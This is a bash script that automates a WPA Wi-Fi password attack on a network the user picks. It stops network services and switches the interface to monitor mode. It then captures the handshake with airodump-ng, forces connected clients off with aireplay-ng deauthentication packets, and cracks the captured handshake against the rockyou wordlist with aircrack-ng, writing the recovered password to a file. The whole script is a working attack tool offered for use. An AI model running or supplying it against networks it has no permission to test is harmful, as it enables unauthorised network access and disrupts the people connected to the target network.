#!/bin/bash
export TERM=xterm
trap ctrl_c INT
function ctrl_c(){
	echo -e " Exiting..."

	./src/reset.sh monitor
	exit 0
}

interface=$(/bin/cat ./content/interface)

function configure_interface(){
	echo -e "\n. . . . Killing processes that may interfere"
	systemctl stop wpa_supplicant NetworkManager
	sleep 1
	echo -e ". . . . Putting interface $interface in monitor mode\n"
	airmon-ng start $interface > /dev/null 2>&1
	sleep 0.5
	iw dev | awk '/Interface/ {iface=$2} /type monitor/ {print iface}' > ./content/interface
	moninterface=$(/bin/cat ./content/interface)
	echo -e "\nInterface $moninterface created\n"
	sleep 1
}

##############################    data    ########################################################

function wifi_data(){
	echo -ne "\n -  A command will now run in a new window showing the available networks\n -  When you have entered all the data, close the window\n"
	sleep 1
	echo -ne "\nPress any key to continue\n"
	while true; do
		read -n 1 -t 0.1 key && break
	done
	xterm -hold -e "airodump-ng $moninterface" &
	echo -ne "\nSpecify the ESSID (name) of the target network exactly: " && read -r victim_essid
	echo -ne "\nMAC address of the target network: " && read -r victim_mac
	echo -ne "\nChannel of the target network: " && read -r victim_channel
	echo -ne "\nSpecify a wordlist to crack the password (rockyou by default): " && read -r wordlist
	if [ "$wordlist" == "" ]; then
		wordlist=$(locate rockyou.txt | grep -v .gz | head -n 1)
	fi
	pid=$(ps | grep xterm | awk '{print $1}')
	kill $pid > /dev/null 2>&1
	sleep 2

}

##############################    Attack    ##########################################

function password_attack(){
	echo -e "\n. . . . Starting the attack\n"; sleep 1
	echo -e " -  Another window will open, press any key to continue\n"; sleep 2
	while true; do
		read -n 1 -t 0.1 key && break
	done
	echo -e ". . . . Capturing the handshake"
	xterm -hold -e "airodump-ng --essid $victim_essid -c $victim_channel --write data/handshake $moninterface 2>/dev/null || airodump-ng --bssid $victim_mac -c $victim_channel --write data/handshake $moninterface" &
	sleep 3
	echo -e ". . . . Sending deauthentication packets"
	aireplay-ng --deauth 10 -a $victim_mac $moninterface > /dev/null 2>&1
	sleep 5
	pid=$(ps | grep xterm | awk '{print $1}')
	kill $pid > /dev/null 2>&1
	echo -e ". . . . Cracking the handshake, this may take a while"
	sleep 3
	xterm -hold -e "aircrack-ng data/handshake*.cap -w $wordlist -l password.txt; sleep 3; exit"
#	aircrack-ng content/handshake*.cap -w $wordlist > password.txt
	echo -e "\nAttack finished, the password has been saved to password.txt"
	sleep 5
	ctrl_c
}

################################    Program start    #############################

clear
configure_interface
wifi_data
password_attack



